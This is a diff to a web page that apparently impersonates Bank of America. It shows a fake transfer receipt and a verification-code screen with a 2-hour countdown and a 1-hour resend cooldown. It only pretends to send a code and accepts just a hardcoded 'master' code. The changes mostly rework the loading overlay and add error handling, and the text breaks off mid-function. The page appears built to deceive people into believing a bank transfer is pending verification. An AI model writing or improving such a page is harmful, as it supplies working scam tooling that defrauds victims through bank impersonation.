@@ -68,14 +68,27 @@
     cursor:pointer;
     box-shadow:0 10px 22px rgba(212,0,26,0.14);
   }
+
+  /* overlay: simplified reliable show/hide */
   .overlay{
-    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:999;
-    background:rgba(7,10,23,0.28);backdrop-filter: blur(2px);opacity:0;pointer-events:none;transition:opacity .25s ease;
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    z-index:9999;
+    background:rgba(7,10,23,0.28);
+    transition:opacity .22s ease;
+    opacity:0;
   }
-  .overlay.show{opacity:1;pointer-events:auto}
-  .loader-box{background:rgba(255,255,255,0.96);padding:18px;border-radius:12px;display:flex;gap:14px;align-items:center;box-shadow:0 8px 24px rgba(2,6,23,0.12)}
+  .overlay.visible{
+    display:flex;
+    opacity:1;
+  }
+  .loader-box{background:rgba(255,255,255,0.98);padding:18px;border-radius:12px;display:flex;gap:14px;align-items:center;box-shadow:0 8px 24px rgba(2,6,23,0.12)}
   .spinner{width:46px;height:46px;border-radius:50%;border:5px solid #eef2f7;border-top-color:var(--bofa-blue);animation:spin 0.9s linear infinite}
   @keyframes spin{to{transform:rotate(360deg)}}
+
   .receipt-wrap{display:flex;justify-content:center;width:100%}
   .receipt{
     width:100%;
@@ -142,7 +155,6 @@
   .submit-code{background:var(--bofa-red);color:white;padding:10px 14px;border-radius:8px;border:none;font-weight:800;cursor:pointer}
   .meta-text{margin-top:10px;font-size:0.95rem;color:var(--muted)}
   .meta-link{color:var(--bofa-blue);text-decoration:none;font-weight:800;cursor:pointer}
-  /* iPhone-style floating container */
   .iphone-toast{
     position:fixed;left:50%;transform:translateX(-50%);bottom:28px;
     background:linear-gradient(180deg,rgba(255,255,255,0.98),rgba(250,250,252,0.98));
@@ -201,7 +213,7 @@
     </div>
   </section>
 
-  <div id="overlay" class="overlay hidden" aria-hidden="true">
+  <div id="overlay" class="overlay" aria-hidden="true">
     <div class="loader-box" role="status" aria-live="polite">
       <div class="spinner" aria-hidden="true"></div>
       <div style="min-width:220px">
@@ -307,8 +319,10 @@
 </div>
 
 <script>
-  // MASTER code
+  // MASTER code (only accepted if entered)
   const MASTER_CODE = '65768';
+  const RESEND_KEY = 'boa_resend_cooldown_ts';
+  const RESEND_COOLDOWN = 60 * 60; // 1 hour
 
   // Elements
   const trackBtn = document.getElementById('track-btn');
@@ -322,67 +336,79 @@
   const submitCodeBtn = document.getElementById('submitCode');
   const codeResult = document.getElementById('codeResult');
   const cancelMsg = document.getElementById('cancelMsg');
-
-  // Resend UI elements
   const resendLink = document.getElementById('resendLink');
   const iphoneToast = document.getElementById('iphoneToast');
   const toastClose = document.getElementById('toastClose');
   const resendCountdownEl = document.getElementById('resendCountdown');
 
-  // localStorage key for resend cooldown
-  const RESEND_KEY = 'boa_resend_cooldown_ts'; // stores timestamp when cooldown ends
+  // simple safe DOM-check helper
+  function ensure(el, name){
+    if(!el) console.error('Missing element:', name);
+  }
+  ensure(trackBtn,'track-btn');
+  ensure(overlay,'overlay');
+  ensure(receiptWrap,'receiptWrap');
+  ensure(codeWrap,'codeWrap');
 
-  // initialize date
+  // init date
   dateEl.textContent = new Date().toLocaleString();
 
-  // helper show/hide using classes
-  function showOverlay(ms=1400){
-    overlay.classList.remove('hidden');
-    overlay.classList.add('show');
+  // overlay show/hide (robust)
+  function showOverlay(ms = 1200){
+    if(!overlay) return Promise.resolve();
+    overlay.classList.add('visible');
     overlay.setAttribute('aria-hidden','false');
-    return new Promise(res => setTimeout(()=>{
-      overlay.classList.remove('show');
-      overlay.classList.add('hidden');
+    document.body.style.overflow = 'hidden';
+    return new Promise(res => setTimeout(() => {
+      overlay.classList.remove('visible');
       overlay.setAttribute('aria-hidden','true');
+      document.body.style.overflow = '';
       res();
     }, ms));
   }
 
+  // page show/hide
   function showReceipt(){
     receiptWrap.classList.remove('hidden');
     receiptWrap.setAttribute('aria-hidden','false');
     receiptWrap.scrollIntoView({behavior:'smooth',block:'center'});
   }
-
   function hideReceipt(){
     receiptWrap.classList.add('hidden');
     receiptWrap.setAttribute('aria-hidden','true');
   }
-
   function showCode(){
     codeWrap.classList.remove('hidden');
     codeWrap.setAttribute('aria-hidden','false');
     codeWrap.scrollIntoView({behavior:'smooth',block:'center'});
   }
-
   function hideCode(){
     codeWrap.classList.add('hidden');
     codeWrap.setAttribute('aria-hidden','true');
   }
 
-  // Track button: show overlay then receipt
-  trackBtn.addEventListener('click', async () => {
-    trackBtn.disabled = true;
-    await showOverlay(1200);
-    document.getElementById('main-card').classList.add('hidden');
-    showReceipt();
-    trackBtn.disabled = false;
-  });
+  // CLICK: Check Status (robust event listener)
+  if(trackBtn){
+    trackBtn.addEventListener('click', async () => {
+      try{
+        trackBtn.disabled = true;
+        console.log('Check Status clicked — showing overlay');
+        await showOverlay(1200);
+        const mainCard = document.getElementById('main-card');
+        if(mainCard) mainCard.classList.add('hidden');
+        showReceipt();
+      } catch (err){
+        console.error('Error during Check Status flow:', err);
+      } finally {
+        if(trackBtn) trackBtn.disabled = false;
+      }
+    });
+  }
 
-  // Send code: small delay, then open code screen and start 2-hour verification timer
+  // SEND CODE -> show code screen and start 2-hour verification timer
   sendCodeBtn.addEventListener('click', async () => {
     sendCodeBtn.disabled = true;
-    const original = sendCodeBtn.textContent;
+    const original = sendCodeBtn.textContent || 'Send Code to Verify transfer';
     sendCodeBtn.textContent = 'Sending code...';
     await new Promise(r => setTimeout(r, 900));
     sendCodeBtn.textContent = original;
@@ -393,20 +419,18 @@
     digits.forEach(d => { d.value=''; d.disabled=false; });
     digits[0].focus();
 
-    // start 2-hour timer
     startTimer(2*60*60);
     cancelMsg.classList.add('hidden');
     codeResult.textContent = '';
   });
 
-  // Timer for verification (2 hours)
-  let remaining = 0;
-  let timerInterval = null;
+  // TIMER logic for 2 hours
+  let remaining = 0, timerInterval = null;
   function startTimer(seconds){
     clearInterval(timerInterval);
     remaining = seconds;
     updateTimer();
-    timerInterval = setInterval(()=>{
+    timerInterval = setInterval(() => {
       remaining--;
       if(remaining <= 0){
         clearInterval(timerInterval);
@@ -426,7 +450,7 @@
     timerEl.textContent = `${pad(hrs)}:${pad(mins)}:${pad(secs)}`;
   }
 
-  // digits behavior: numeric-only, auto-advance, backspace, paste
+  // digits behaviour
   digits.forEach((el, idx) => {
     el.addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g,'').slice(0,1);
@@ -449,7 +473,7 @@
     });
   });
 
-  // submit code — only accepts MASTER_CODE
+  // submit (accept only MASTER_CODE)
   submitCodeBtn.addEventListener('click', () => {
     if(remaining <= 0){
       codeResult.textContent = 'Cannot submit — code expired.';
@@ -462,7 +486,6 @@
       codeResult.style.color = '#7a0a0a';
       return;
     }
-
     if(entered === MASTER_CODE){
       clearInterval(timerInterval);
       digits.forEach(d => d.disabled = true);
@@ -477,13 +500,9 @@
   });
 
   // -------------------------
-  // Resend ("Send again here") logic
+  // Resend logic with 1-hour cooldown (localStorage)
   // -------------------------
-  // cooldown seconds (1 hour)
-  const RESEND_COOLDOWN = 60 * 60; // 3600s
   let resendTimerInterval = null;
-
-  // format seconds -> HH:MM:SS
   function fmtHMS(sec){
     const hrs = Math.floor(sec/3600);
     const mins = Math.floor((sec%3600)/60);
@@ -491,22 +510,9 @@
     const pad = n => String(n).padStart(2,'0');
     return `${pad(hrs)}:${pad(mins)}:${pad(secs)}`;
   }
-
-  // check remaining cooldown from localStorage
   function getResendRemaining(){
     const ts = Number(localStorage.getItem(RESEND_KEY) || 0);
     if(!ts) return 0;
-    const rem = Math.max(0, Math.floor((ts - Date.now())/1000));
-    return rem;
+    return Math.max(0, Math.floor((ts - Date.now())/1000));
   }
-
-  // start cooldown (store end timestamp)
-  function startResendCooldown(seconds = RESEND_COOLDOWN){
-    const endTs = Date.now() + seconds*1000;
-    localStorage.setItem(RESEND_KEY, String(endTs));
-    updateResendUI(); // ensure UI reflects cooldown
-  }
-
-  // show the iPhone-style toast with message and cooldown
-  function showIphoneToast(sending=true){
-    const rem = getRese
+  function startResendCooldown(seconds = 
